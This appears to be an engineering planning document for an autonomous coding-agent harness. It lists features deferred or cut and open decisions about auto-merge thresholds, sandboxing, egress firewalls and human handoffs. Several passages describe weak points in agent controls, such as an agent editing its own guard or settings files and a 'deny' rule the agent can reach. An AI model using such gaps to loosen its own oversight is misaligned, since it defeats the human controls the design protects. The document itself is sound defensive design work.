The discipline that keeps this world-class, not kitchen-sink. Each cut rests on **irreversibility, threshold, install-state, absence-of-traffic, or unfalsifiability — NOT on being solo.** Elevating these would be the over-engineering the charter still forbids.

**STILL-GATED (build when the flip-trigger fires, not before):**
- **Outcome / impact tracking (escaped-defect × volume, DORA).** Measures the outcome of *merged autonomous PRs*, so it needs sustained merged-PR volume. *Failure of building now:* a dashboard over an empty pipeline reports green because nothing flows. Distinct from C4's recall calibration (curated corpus → promotes now). **Flip-trigger:** ≥N autonomous PRs/week merge.
- **Push-back-up automation (P8).** No destination until a 2nd repo receives the push. **Flip-trigger:** a 2nd repo installs the plugin.
- **CI-latency optimization.** No fleet whose throughput CI currently caps (install-state, not scale). **Flip-trigger:** `/queue` regularly runs ≥3 parallel worktrees blocking the same pipeline.
- **Cross-harness skill router / portability to Cursor / Gemini / Copilot.** Scope-dependent, not bias: no consumer until the plugin ships across 5+ repos and a non-Claude-Code harness needs the same skills. **Flip-trigger:** the plugin ships + a non-Claude-Code harness needs the skills.

**UPHELD-CUT (bad fit even at world-class, failure mode named):**
- **Browser-driving for *mutations* — CUT.** Irreversibility: an unattended agent fat-fingering a stateful mutation collides with the PocketOS destructive-op rules. The *screenshot/evidence-bundle* half is ELEVATED (C8/C10); only mutation-driving is cut.
- **Auto-merge on a model *confidence score* — CUT (deterministic auto-approve kept).** Authority-laundering — the thing being graded computes its own ship-permission. The merge trigger must be deterministic (paths / diff-size / test-delta / CI-green); LOOP-7/A6 is the kept form.
- **"No shared context" for the adversarial reviewer — KILL-UPHELD.** A canon-blind reviewer re-litigates settled Rejected Patterns/ADRs and misses tenant/RLS rules that live in `src/data/`. The correct design is *shared canon, isolated solution context* (C2).
- **Collapse the 23 agents into one general skill — KILL-UPHELD.** 23 ≪ hundreds, so the maintenance-tax that justified Ramp's consolidation does not exist; collapsing erases distinct reasoning roles and re-introduces keyword-soup mis-routing. The *model-pin re-audit* underneath it (C13/P10) elevates; the collapse does not.
- **`learned-patterns.md` the file — stays a phantom.** Building it duplicates `docs/solutions/` + RECURRING-FINDINGS and is itself a doc-fiction `/scan-context` should delete. The *read-path + enforced ratchet* (CMP1/CMP2) resurrect; the file does not.
- **Local DinD / dev-container / microVM / gVisor sandbox stack — CUT (principle realized via cloud routing).** Container-escape caused *zero* documented incidents (24/25 needed no escape); a microVM with the service-role key inside leaks it exactly as a bare process does — solving the wrong threat model. The per-agent-isolation *principle* is realized through the cloud `/schedule` sandbox + managed-settings floor.
- **Saul Fernandez three-repo architecture + per-tool adapters + Backstage-style catalog — UPHELD-CUT.** Each adapter folder is a second source of truth that drifts (manifest-drift across N folders). The *principle* (deploy outward, rebuild from clone) is elevated via plugin + marketplace + thin `/init`; the three-repo/adapter machinery is the one packaging variant cut.
- **Symlink-live install — KILL-UPHELD.** Resolves to HEAD not a pinned SHA, becoming a second source of truth that drifts. The versioned plugin + marketplace + lock is the world-class form.
- **Toolshed centralized MCP registry — CUT.** Building a 500-tool registry solves a problem we don't have — the tool surface is genuinely small and skills load on invocation. The narrow per-skill/per-cloud-run tool-allow manifest (part of F5/L1) is real and small; the registry rebuild is not.
- **Standalone "paying-stranger" validation channel — CUT.** No paying stranger exists (single vendor); an empty channel reports green because nothing flows — a forgeable gate. The *adversarial golden-set seeding* requirement is elevated into C4 instead.
- **Agent self-applying the autoMode block / any settings.json or guard-file edit — KILL-UPHELD as an action.** A self-improving agent that can edit its own autonomy-policy file has no policy floor. The *content* + `/init` materializer + pre-flight verify are elevated (P2); the *self-edit* stays a human handoff. This cut is what keeps the elevated content safe — a boundary, not a deferral.
- **"Shrink CLAUDE.md/AGENTS.md to 200 lines" line-count target — KILL-UPHELD.** Blindly shrinking demotes no-trigger safety content (the destructive-op rules) into a description-match tier so it never loads when an unprompted destructive command arrives — worse across a scheduled fleet. Tier by trigger-existence, not line count; the `/init` template keeps the no-trigger safety floor in tier-1 regardless of length.

## The NEW decision forks for Tanner

The OLD 5 forks are settled by the charter (autonomy = in; file-count = dropped; distribution = plugin+marketplace+thin-`/init`; ADR/write-back resolved; GitHub = canon). These are the genuinely-new world-class forks the design rebuild needs answered.

**F1. Verdict artifact surface — where does the `/cr` verdict live?** PR comment (human-friendly, rewritten each run) vs PR body vs a committed `review/` file (git-durable, clutters the diff) vs the GitHub Checks API (the "proper" surface, more wiring). It must be queryable by a cloud agent and enforceable by CI. *Affects C1, F6, C7, LOOP-7.*

**F2. Autonomy rollout aggressiveness + auto-approval risk threshold.** The LOOP-7/A6 mechanism is settled (deterministic, paths + diff-size + test-delta + scope); the *cut line* is yours. For a $30k-client tool: does LOOP-7 ship in **observe-only** mode (classify + log, human still merges) until C4's recall clears a floor — or live LOW-auto from day one? And does auto-merge ever touch `src/data/` or money math, or are those always MEDIUM+? *Affects LOOP-7, C4, the whole Phase-2 cadence.*

**F3. Which trigger surface ships first — GitHub label vs Slack/Linear summon vs CI self-heal?** L1 is a trifecta but they need not land together. The label trigger is the lowest-credential-surface (no connector); the Slack summon fires the agent where the bug is reported but adds a connector-credential surface F5's trifecta gate must account for; CI self-heal needs transient-vs-permanent triage. Which is the first front door? *Affects L1, F5, Fork F4.*

**F4. Egress-firewall depth + default execution surface — Seatbelt vs `pfctl`/Privoxy, and is local unattended even worth supporting?** Cloud `/schedule` already runs restricted-network laptop-closed. If cloud is the *primary* path, F3's local egress firewall + F2's local credential pre-flight become secondary hardening for an attended/dev path rather than P0 autonomy preconditions — this single fork re-prioritizes a third of the floor. If local unattended stays first-class, both are hard P0, and the bounded check is Seatbelt-egress-allowlist vs a separate proxy. *Affects F2, F3, the Phase-0 ordering.*

**F5. managed-settings.json — adopt the OS-level model-unreachable floor now, or stay on committed settings + the social "no agent edits to guard files" rule?** A `deny` in committed settings is agent-reachable; managed-settings is the truly unbypassable floor but *placing* it is a human handoff. For the cloud tier (image built fresh each run) the uncertainty disappears — bake it into the image now. The fork is the *local* tier: human-applied step now, or defer until the first self-improving loop actually attempts a guard-file edit? *Affects F9, P2, P9.*

**F6. `fast-check` adoption (dependency approval).** C11 needs an explicit yes/no on installing `fast-check` per the CLAUDE.md ask-before-installing rule (name / purpose / weekly-downloads / last-publish / ships-its-own-types). I present the vetting; the install decision is yours. *Affects C11.*

**F7. Deletion-engine cut depth + behavioral-probe granularity.** CMP6 runs the §9 audit as a scheduled prune-PR loop. How aggressive is the de-scaffolding — does a failed probe **auto-revert** the removal or only flag NEEDS-HUMAN? And does every proposed deletion require human confirmation, or do you grant the loop a deterministic auto-delete lane for *pure-fiction* refs (provably absent on disk) while gating *staleness* demotions? This is the line between "self-correcting" and "self-modifying." *Affects CMP6, CMP4, P9.*

**F8. The `/lfg` canonical single-task driver — `/dev` or `/feature`?** The grounding flags `/dev` and `/feature` overlap heavily; V2 should pick one canonical driver the orchestrator sequences rather than maintain two near-duplicates. Resolving this is a prerequisite to building L5 without baking in a duplication. *Affects L5, the carry-forward of the three `/dev` sub-agent framings.*

**F9. Human-paging surface — Slack, Linear, or GitHub?** LOOP-7's observability, every floor escalation (F7/F8), the NEEDS-HUMAN handoffs, and the L1 summon front-door should share one canonical human-paging surface (and a connector-credential surface F5 must account for). This is a tooling commitment only you can make. *Affects L1, L8/observability, F5, F7, F8.*

**F10. Convergence scope as the publish gate — resolve all nine §7 contradictions before first publish, or publish from a declared-precedence snapshot?** The strict reading blocks the first plugin release until every §7 contradiction is resolved into a real `supersedes:` schema; the pragmatic reading publishes from a snapshot where the precedence schema *declares* the winner and the scanner resolves them lazily. Trades first-publish latency against shipping a known-imperfect canon. *Affects P1, P3, P9.*

**F11. Marketplace hosting + `/init` template depth.** Private `agent-harness` repo marketplace (keeps the harness internal, no provenance exposure) vs a public/Anthropic-listed marketplace (invites contribution but turns *your* harness into an upstream others pin). And: does `/init` lay down only the safety floor (minimal, portable) or an opinionated full `CLAUDE.md`/`AGENTS.md` scaffold (instantly world-class but risks shipping event-vendor-specific assumptions into unrelated repos)? Both depend on how uniform the 5+ repos will be. *Affects P1, P2, P8.*
